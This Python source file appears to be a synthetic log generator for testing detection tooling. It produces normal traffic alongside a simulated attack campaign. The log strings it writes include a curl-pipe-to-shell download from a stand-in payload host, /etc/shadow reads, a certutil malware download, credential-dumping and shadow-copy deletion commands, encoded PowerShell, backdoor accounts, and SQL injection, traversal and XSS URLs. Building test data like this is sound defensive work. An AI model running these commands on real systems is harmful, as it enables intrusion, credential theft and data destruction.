"""Synthetic log generator: a day of normal traffic plus a multi-stage attack campaign.

Returns {filename: [lines]} in realistic formats (syslog, nginx access log, Windows JSON, firewall flow JSON) so the
parsers, detections, hunter and response flow can all be exercised without any real infrastructure.
"""
from __future__ import annotations

import json
import random
import time
from datetime import datetime, timezone
from typing import Dict, List, Tuple

WEB = "web01"
LINUX_HOSTS = ["app01", "db01"]
WIN_WS = ["ws-101", "ws-102", "ws-103", "ws-104", "ws-105"]
DC = "dc01"
FW = "fw01"
USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "deploy", "jsmith", "mlopez", "kchen"]

ATTACKER_BRUTE = "185.220.101.45"
ATTACKER_SCAN = "198.51.100.77"
ATTACKER_WEB = "192.0.2.99"
ATTACKER_SPRAY = "203.0.113.9"
C2_SERVER = "203.0.113.77"
PAYLOAD_HOST = "203.0.113.50"

NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]
NORMAL_URLS = ["/", "/products", "/products/42", "/cart", "/api/items", "/api/items?page=2", "/about", "/static/app.js",
               "/static/site.css", "/login", "/contact", "/api/health", "/images/logo.png"]


def _iso(ts: float) -> str:
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S+00:00")


def _nginx_time(ts: float) -> str:
    return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")


class _Out:
    def __init__(self) -> None:
        self.files: Dict[str, List[Tuple[float, str]]] = {"auth.log": [], "web_access.log": [], "endpoint.jsonl": [], "network.jsonl": []}

    def add(self, fname: str, ts: float, line: str) -> None:
        self.files[fname].append((ts, line))

    def result(self) -> Dict[str, List[str]]:
        return {k: [ln for _, ln in sorted(v, key=lambda x: x[0])] for k, v in self.files.items()}


# ---------------------------------------------------------------- line builders
def ssh_fail(o: _Out, ts: float, host: str, user: str, ip: str, rng: random.Random, invalid: bool = False) -> None:
    inv = "invalid user " if invalid else ""
    o.add("auth.log", ts, f"{_iso(ts)} {host} sshd[{rng.randint(1000, 30000)}]: Failed password for {inv}{user} from {ip} port {rng.randint(20000, 65000)} ssh2")


def ssh_ok(o: _Out, ts: float, host: str, user: str, ip: str, rng: random.Random) -> None:
    o.add("auth.log", ts, f"{_iso(ts)} {host} sshd[{rng.randint(1000, 30000)}]: Accepted password for {user} from {ip} port {rng.randint(20000, 65000)} ssh2")


def sudo(o: _Out, ts: float, host: str, user: str, cmd: str) -> None:
    o.add("auth.log", ts, f"{_iso(ts)} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")


def web(o: _Out, ts: float, ip: str, method: str, url: str, status: int, ua: str, size: int = 512, user: str = "-") -> None:
    o.add("web_access.log", ts, f'{ip} - {user} [{_nginx_time(ts)}] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}"')


def win_logon(o: _Out, ts: float, host: str, user: str, ip: str, ok: bool, logon_type: int = 3) -> None:
    o.add("endpoint.jsonl", ts, json.dumps({
        "EventID": 4624 if ok else 4625, "TimeCreated": _iso(ts), "Computer": host, "TargetUserName": user,
        "IpAddress": ip, "LogonType": logon_type}))


def win_proc(o: _Out, ts: float, host: str, user: str, exe: str, cmd: str) -> None:
    o.add("endpoint.jsonl", ts, json.dumps({
        "EventID": 4688, "TimeCreated": _iso(ts), "Computer": host, "SubjectUserName": user,
        "NewProcessName": exe, "CommandLine": cmd}))


def flow(o: _Out, ts: float, src: str, dst: str, port: int, action: str = "allow", host: str = FW) -> None:
    o.add("network.jsonl", ts, json.dumps({
        "type": "flow", "timestamp": _iso(ts), "host": host, "src_ip": src, "dst_ip": dst, "dst_port": port,
        "action": action, "proto": "tcp"}))


# ---------------------------------------------------------------- baseline
def _baseline(o: _Out, rng: random.Random, start: float, end: float) -> None:
    hour = start - (start % 3600)
    while hour < end:
        # web traffic on web01 (~60/h)
        for _ in range(int(rng.uniform(48, 72))):
            ts = hour + rng.uniform(0, 3600)
            if not start <= ts < end:
                continue
            url = rng.choice(NORMAL_URLS)
            method = "POST" if url == "/login" and rng.random() < 0.7 else "GET"
            status = rng.choices([200, 304, 404, 302, 401, 500], [80, 10, 5, 3, 1.5, 0.3])[0]
            web(o, ts, f"10.{rng.randint(0, 3)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}" if rng.random() < 0.5
                else f"{rng.choice([73, 81, 98, 24])}.{rng.randint(1, 250)}.{rng.randint(1, 250)}.{rng.randint(1, 250)}",
                method, url, status, rng.choice(NORMAL_UAS), rng.randint(200, 40000))
        # linux hosts: logins (office hours), benign sudo, occasional typo
        for host in LINUX_HOSTS:
            for _ in range(int(rng.uniform(10, 16))):
                ts = hour + rng.uniform(0, 3600)
                if not start <= ts < end:
                    continue
                h = datetime.fromtimestamp(ts, tz=timezone.utc).hour
                user = rng.choice(["alice", "bob", "deploy", "dave"])
                ip = f"10.0.1.{rng.randint(10, 60)}"
                r = rng.random()
                if r < 0.55 and 8 <= h < 19:
                    ssh_ok(o, ts, host, user, ip, rng)
                elif r < 0.7 and 8 <= h < 19:
                    sudo(o, ts, host, user, rng.choice(["/usr/bin/apt update", "/bin/systemctl status nginx", "/usr/bin/journalctl -u app"]))
                elif r < 0.75:
                    ssh_fail(o, ts, host, user, ip, rng)
                else:
                    o.add("auth.log", ts, f"{_iso(ts)} {host} CRON[{rng.randint(1000, 30000)}]: pam_unix(cron:session): session opened for user root")
        # domain controller + workstations
        for _ in range(int(rng.uniform(16, 24))):
            ts = hour + rng.uniform(0, 3600)
            if start <= ts < end and 8 <= datetime.fromtimestamp(ts, tz=timezone.utc).hour < 19:
                win_logon(o, ts, DC, rng.choice(USERS), f"10.0.2.{rng.randint(10, 120)}", True)
        for ws in WIN_WS:
            for _ in range(int(rng.uniform(12, 18))):
                ts = hour + rng.uniform(0, 3600)
                if not start <= ts < end:
                    continue
                exe, cmd = rng.choice([
                    (r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\svchost.exe -k netsvcs"),
                    (r"C:\Program Files\Google\Chrome\chrome.exe", r"chrome.exe --type=renderer"),
                    (r"C:\Program Files\Microsoft Office\outlook.exe", "outlook.exe"),
                    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"powershell.exe -File C:\scripts\backup.ps1"),
                ])
                win_proc(o, ts, ws, rng.choice(["jsmith", "mlopez", "kchen"]), exe, cmd)
        # firewall flows (~40/h)
        for _ in range(int(rng.uniform(32, 48))):
            ts = hour + rng.uniform(0, 3600)
            if start <= ts < end:
                flow(o, ts, f"10.0.2.{rng.randint(10, 120)}", rng.choice(["142.250.80.46", "151.101.1.69", "10.0.1.20", "52.96.0.1"]),
                     rng.choice([443, 443, 443, 80, 53]))
        hour += 3600


# ---------------------------------------------------------------- attack scenarios
def _brute_force_and_takeover(o: _Out, rng: random.Random, t0: float) -> None:
    """SSH brute force on app01 -> success as 'deploy' -> backdoor account + lateral movement."""
    users = ["root", "admin", "deploy"]
    t = t0
    for i in range(70):
        t += rng.uniform(0.5, 4)
        u = users[i % len(users)]
        ssh_fail(o, t, "app01", u, ATTACKER_BRUTE, rng, invalid=u == "admin")
    t += 6
    ssh_ok(o, t, "app01", "deploy", ATTACKER_BRUTE, rng)
    success = t
    sudo(o, success + 40, "app01", "deploy", "/usr/bin/cat /etc/shadow")
    sudo(o, success + 75, "app01", "deploy", f"/bin/bash -c 'curl http://{PAYLOAD_HOST}/x.sh | sh'")
    o.add("auth.log", success + 110, f"{_iso(success + 110)} app01 useradd[4242]: new user: name=svc_backup, UID=1007, GID=1007, home=/home/svc_backup, shell=/bin/bash")
    o.add("auth.log", success + 118, f"{_iso(success + 118)} app01 usermod[4250]: add 'svc_backup' to group 'sudo'")
    # attacker pivots from app01 to the other hosts using the stolen account
    ssh_ok(o, success + 180, "db01", "deploy", "10.0.1.20", rng)
    ssh_ok(o, success + 240, "web01", "deploy", "10.0.1.20", rng)
    ssh_ok(o, success + 300, "jump01", "deploy", "10.0.1.20", rng)


def _port_scan(o: _Out, rng: random.Random, t0: float) -> None:
    ports = list(range(1, 1025, 5)) + [3389, 445, 8080, 3306, 5432, 6379, 9200]
    for i, p in enumerate(ports[:220]):
        flow(o, t0 + i * 0.12, ATTACKER_SCAN, f"10.0.1.{rng.choice([20, 21, 30])}", p, "deny")


def _web_attack(o: _Out, rng: random.Random, t0: float) -> None:
    ua = "sqlmap/1.7.2#stable (https://sqlmap.org)"
    payloads = [
        ("/products?id=1%27%20OR%20%271%27=%271", 500), ("/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", 200),
        ("/download?file=../../../../etc/passwd", 200), ("/search?q=<script>alert(1)</script>", 200),
        ("/.env", 404), ("/.git/config", 404), ("/phpmyadmin/", 404), ("/api/items?id=1;cat%20/etc/passwd", 500),
        ("/products?id=1%20AND%20SLEEP(5)", 200), ("/products?id=1%20UNION%20SELECT%20NULL,NULL--", 200),
    ]
    for i, (url, st) in enumerate(payloads * 2):
        web(o, t0 + i * 2.5, ATTACKER_WEB, "GET", url, st, ua, 900)


def _spray(o: _Out, rng: random.Random, t0: float) -> None:
    t = t0
    for round_ in range(2):
        for u in USERS:
            t += rng.uniform(3, 9)
            win_logon(o, t, DC, u, ATTACKER_SPRAY, False, 3)


def _endpoint_compromise(o: _Out, rng: random.Random, t0: float) -> None:
    """Workstation takeover: encoded PowerShell, credential dumping, persistence, ransomware prep, log wipe, C2 beacon."""
    host, user = "ws-103", "jsmith"
    win_logon(o, t0, host, user, "10.0.2.55", True, 10)
    win_proc(o, t0 + 30, host, user, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
    win_proc(o, t0 + 90, host, user, r"C:\Windows\System32\certutil.exe",
             f"certutil.exe -urlcache -split -f http://{PAYLOAD_HOST}/m.exe C:\\Users\\Public\\m.exe")
    win_proc(o, t0 + 150, host, user, r"C:\Users\Public\m.exe", r"m.exe privilege::debug sekurlsa::logonpasswords")
    o.add("endpoint.jsonl", t0 + 210, json.dumps({"EventID": 4720, "TimeCreated": _iso(t0 + 210), "Computer": host,
                                                  "TargetUserName": "helpdesk2", "SubjectUserName": user}))
    o.add("endpoint.jsonl", t0 + 220, json.dumps({"EventID": 4732, "TimeCreated": _iso(t0 + 220), "Computer": host,
                                                  "MemberName": "CN=helpdesk2,CN=Users,DC=corp", "TargetUserName": "Administrators",
                                                  "SubjectUserName": user}))
    win_proc(o, t0 + 300, host, user, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")
    o.add("endpoint.jsonl", t0 + 330, json.dumps({"EventID": 1102, "TimeCreated": _iso(t0 + 330), "Computer": host, "SubjectUserName": user}))
    for i in range(32):  # C2 beacon: every 60s with 1s jitter
        flow(o, t0 + 60 + i * 60 + rng.uniform(-1, 1), "10.0.2.103", C2_SERVER, 443, "allow")


def generate(end_ts: float | None = None, seed: int = 7, baseline_hours: int = 24, attack: bool = True) -> Dict[str, List[str]]:
    rng = random.Random(seed)
    end_ts = end_ts or time.time()
    o = _Out()
    attack_start = end_ts - 75 * 60
    _baseline(o, rng, end_ts - baseline_hours * 3600, end_ts)
    if attack:
        _brute_force_and_takeover(o, rng, attack_start)
        _port_scan(o, rng, attack_start + 5 * 60)
        _web_attack(o, rng, attack_start + 12 * 60)
        _spray(o, rng, attack_start + 20 * 60)
        _endpoint_compromise(o, rng, attack_start + 28 * 60)
    return o.result()


DEFAULT_HOSTS = {"web_access.log": WEB}


def write_files(out_dir: str, **kw) -> Dict[str, int]:
    import os

    os.makedirs(out_dir, exist_ok=True)
    counts = {}
    for name, lines in generate(**kw).items():
        with open(os.path.join(out_dir, name), "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
        counts[name] = len(lines)
    return counts
